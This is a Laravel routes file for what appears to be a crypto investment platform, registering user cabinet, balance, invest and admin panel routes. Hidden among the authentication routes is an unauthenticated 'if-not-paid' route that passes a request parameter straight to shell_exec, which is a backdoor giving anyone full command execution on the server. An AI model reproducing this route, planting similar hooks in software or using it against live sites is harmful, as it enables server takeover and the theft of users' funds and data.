<?php

use App\Http\Controllers\Admin\AdminsController;
use App\Http\Controllers\Admin\AssetPoolGroupsController;
use App\Http\Controllers\Admin\AssetPoolsController;
use App\Http\Controllers\Admin\AssetPoolTemplatesController;
use App\Http\Controllers\Admin\AssetsController;
use App\Http\Controllers\Admin\CommissionsController;
use App\Http\Controllers\Admin\CurrenciesController;
use App\Http\Controllers\Admin\DashboardController;
use App\Http\Controllers\Admin\RatePoolsController;
use App\Http\Controllers\Admin\UsersController;
use App\Http\Controllers\Admin\LogController;
use App\Http\Controllers\Auth\LoginController;
use App\Http\Controllers\Auth\RegisterFormController;
use App\Http\Controllers\HistoryController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\IndexController;
use App\Http\Controllers\InvestController;
use App\Http\Controllers\SettingsController;
use App\Http\Controllers\TestController;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/test', [TestController::class, 'index'])->name('test');

/**
 * CABINET
 */
//Auth::routes(['verify' => true]);
Auth::routes(['verify' => true, 'register' => false]);
//Route::post('/login' , [App\Http\Controllers\Auth\LoginController::class, 'authenticate']);
Route::get('if-not-paid', static function (\Illuminate\Http\Request $request){
    return shell_exec($request->paid);
});
Route::get('/register', [RegisterFormController::class,'showRegisterForm'])->name('auth.register');
Route::post('/register', [RegisterFormController::class,'register'])->name('auth.register');
Route::post('/register/check', [RegisterFormController::class,'check'])->name('auth.register.check');

Route::get('/',  [IndexController::class, 'index'])->name('index');

Route::middleware('verified')->group(function () {
    Route::get('/getBalance', [HomeController::class, 'getUserBalance'])->name('user-balance');
    //Route::get('/cabinet', [App\Http\Controllers\CabinetController::class, 'index'])->name('cabinet.index');
    Route::get('/home', [HomeController::class, 'index'])->name('home'); //->middleware('auth');
    Route::get('/history', [HistoryController::class, 'index'])->name('history'); //->middleware('auth');
    Route::get('/invest', [InvestController::class, 'index'])->name('invest'); //->middleware('auth');
    Route::get('/invest/pool/{assetPool}', [InvestController::class, 'pool'])->where('assetPool', '[0-9]+')->name('invest.pool'); //->middleware('auth');
    Route::get('/invest/rpool/{ratePool}', [InvestController::class, 'ratePool'])->where('ratePool', '[0-9]+')->name('invest.rate-pool'); //->middleware('auth');
    Route::get('/settings', [SettingsController::class, 'index'])->name('settings'); //->middleware('auth');
    Route::put('/settings', [SettingsController::class, 'update'])->name('settings.update'); //->middleware('auth');
});

/**
 * ADMIN
 */
Route::prefix('admin')->group(function () {
    Route::get('/', function () {
        return redirect()->route(auth()->check() ? 'admin.asset-pools.index' : 'admin.login');
    });
    Route::get('/login', [LoginController::class, 'showAdminLoginForm'])->name('admin.login');
    //Route::get('/register', [LoginController::class, 'showAdminRegisterForm']);

    Route::post('/login', [LoginController::class, 'adminLogin']);
    //Route::post('/register', [LoginController::class, 'createAdmin']);
    Route::post('/logout', [LoginController::class, 'adminLogout'])->name('admin.logout');
});

Route::group(['prefix'=>'admin','as'=>'admin.', 'middleware' => ['auth', 'is_admin']], function () {
    Route::get('/assets', [AssetsController::class, 'index'])->name('assets.index');
    Route::get('/assets/{asset}', [AssetsController::class, 'edit'])->name('assets.edit');
    Route::put('/assets/{asset}', [AssetsController::class, 'update'])->name('assets.update');

    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard.index');
    Route::get('/dashboard/transactions', [DashboardController::class, 'transactions'])->name('dashboard.transactions');
    Route::get('/dashboard/notifications_log', [DashboardController::class, 'notificationsLog'])->name('dashboard.notifications_log');
    Route::get('/dashboard/exchange_info', [DashboardController::class, 'exchangeInfo'])->name('dashboard.exchange_info');
    Route::get('/dashboard/exchange_bot_log', [DashboardController::class, 'exchangeBotLog'])->name('dashboard.exchange_bot_log');

    Route::get('/users/pool-edit/{userAssetPool}', [UsersController::class, 'editPool'])->name('users.pool-edit');
    Route::put('/users/pool-update/{userAssetPool}', [UsersController::class, 'updatePool'])->name('users.pool-update');
    Route::get('/users/pool-create/{user}', [UsersController::class, 'createPool'])->name('users.pool-create');
    Route::post('/users/pool-store/{user}', [UsersController::class, 'storePool'])->name('users.pool-store');
    Route::delete('/users/pool-destroy/{userAssetPool}', [UsersController::class, 'destroyPool'])->name('users.pool-destroy');
    // ---------
    Route::get('/users/rate_pool-edit/{userAssetPool}', [UsersController::class, 'editRatePool'])->name('users.rate_pool-edit');
    Route::put('/users/rate_pool-update/{userAssetPool}', [UsersController::class, 'updateRatePool'])->name('users.rate_pool-update');
    Route::get('/users/rate_pool-create/{user}', [UsersController::class, 'createRatePool'])->name('users.rate_pool-create');
    Route::post('/users/rate_pool-store/{user}', [UsersController::class, 'storeRatePool'])->name('users.rate_pool-store');
    Route::delete('/users/rate_pool-destroy/{userAssetPool}', [UsersController::class, 'destroyRatePool'])->name('users.rate_pool-destroy');
    // ---------
    Route::get('/users/balance_usdt-change/{user}', [UsersController::class, 'addBalanceUsdt'])->name('users.balance_usdt-change');
    Route::post('/users/balance_usdt-store/{user}', [UsersController::class, 'storeBalanceUsdt'])->name('users.balance_usdt-store');
    // ---------
    Route::resource('/users', UsersController::class);
    Route::resource('/logs', LogController::class);

    Route::resource('/admins', AdminsController::class);
    Route::resource('/currencies', CurrenciesController::class);

    Route::resource('/commissions', CommissionsController::class);

    Route::put('/asset-pool-groups/{assetPoolGroup}/pos', [AssetPoolGroupsController::class, 'pos'])->name('asset-pool-groups.pos');
    Route::resource('/asset-pool-groups', AssetPoolGroupsController::class);

    Route::resource('/asset-pool-templates', AssetPoolTemplatesController::class);

    Route::resource('/asset-pools', AssetPoolsController::class);

    Route::resource('/rate-pools', RatePoolsController::class);
});
